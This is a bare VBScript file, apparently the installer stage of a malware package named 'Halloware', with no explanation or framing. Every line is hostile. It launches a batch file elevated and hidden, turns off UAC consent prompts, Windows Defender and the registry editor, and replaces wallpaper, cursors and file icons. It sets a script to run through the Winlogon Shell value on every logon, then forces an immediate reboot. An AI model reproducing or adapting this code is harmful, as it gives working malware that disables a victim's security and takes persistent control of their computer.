set x = createobject("Wscript.Shell")
set c = createobject("scripting.filesystemobject")
set objshell = createobject("Shell.Application")
dim ke : ke = "C:\Program Files\Halloware\bin"
'/////////////////////////////////////////////////////////////////
'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\







objshell.shellexecute"""C:\Program Files\Halloware\takeown.bat""",,,"runas",0  
x.RegWrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\system\wallpaper",""&ke&"\@tile@@.jpg","REG_SZ"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop\NoChangingWallPaper","1","REG_DWORD"
x.RegWrite"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system\ConsentPromptBehaviorAdmin","0","REG_DWORD"
x.RegWrite"HKCU\Control Panel\Cursors\Arrow",""&ke&"\pumpcur.cur","REG_SZ"
x.RegWrite"HKCU\Control Panel\Cursors\AppStarting",""&ke&"\pumpcur.cur","REG_SZ"
x.RegWrite"HKCU\Control Panel\Cursors\Hand",""&ke&"\pumpcur.cur","REG_SZ"
x.RegWrite"HKCR\txtfile\DefaultIcon\",""&ke&"\pump.ico","REG_SZ"
x.RegWrite"HKCR\exefile\DefaultIcon\",""&ke&"\pump.ico","REG_SZ"
x.RegWrite"HKCR\mp3file\DefaultIcon\",""&ke&"\pump.ico","REG_SZ"
x.RegWrite"HKCR\mp4file\DefaultIcon\",""&ke&"\pump.ico","REG_SZ"
x.RegWrite"HKCR\inifile\DefaultIcon\",""&ke&"\pump.ico","REG_SZ"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\disabletaskmgr","0","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\disableregistrytools","1","REG_DWORD"
x.RegWrite"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware","1","REG_DWORD"
x.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell","explorer.exe, wscript.exe ""C:\Program Files\Halloware\permaban.vbs""","REG_SZ"
x.run """C:\Program Files\halloware\findit.bat""",0


wscript.sleep 10000
if c.FileExists("C:\Program Files\Halloware\backup\logonuI.bak") then
x.run "shutdown.exe -r -t 00",0
else
wscript.sleep 1000
x.run "shutdown.exe -r -t 00",0
end if






